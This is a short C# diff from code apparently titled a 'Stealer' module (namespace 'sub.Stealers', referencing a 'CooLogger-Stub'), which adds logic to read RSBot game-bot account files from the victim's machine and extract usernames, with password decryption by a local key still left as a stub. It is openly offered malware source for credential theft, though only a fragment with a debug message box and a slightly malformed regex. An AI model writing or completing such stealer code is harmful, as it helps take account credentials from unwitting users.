@@ -5,6 +5,8 @@ using System.IO;
 using System.Net.NetworkInformation;
 using System.Security.Cryptography;
 using System.Text;
+using System.Text.RegularExpressions;
+using System.Windows.Forms;
 
 namespace sub.Stealers
 {
@@ -44,15 +46,19 @@ namespace sub.Stealers
         private IEnumerable<RSBotAccount> GetLocalAccounts(string accountFileData, byte[] key)
         {
             //Needs to parse data out of accountFileData and decrypt password with key
-            /*
-            System.Collections.Generic.List<RSBotAccount> ret = new System.Collections.Generic.List<RSBotAccount>();
-            RSBotAccount account = new RSBotAccount(username, password, passwordHash, pin, reward, takeBreaks, member);
-            ret.Add(account);
+            
+            List<RSBotAccount> ret = new List<RSBotAccount>();
 
-            return ret.ToArray();*/
+            MatchCollection matches = new Regex(@"\[[a-zA-Z0-9_]{1, 12}\]").Matches(accountFileData);
+            foreach (Match m in matches)
+            {
+                string username = m.Value.Replace("[", "").Replace("]", "");
+                MessageBox.Show(username);
+                //RSBotAccount account = new RSBotAccount(username, password, passwordHash, pin, reward, takeBreaks, member);
+                //ret.Add(account);
+            }
 
-            //Original code is in CooLogger-Stub.txt
-            return null;
+            return ret.ToArray();
         }
 
         private byte[] GetLocalKey()
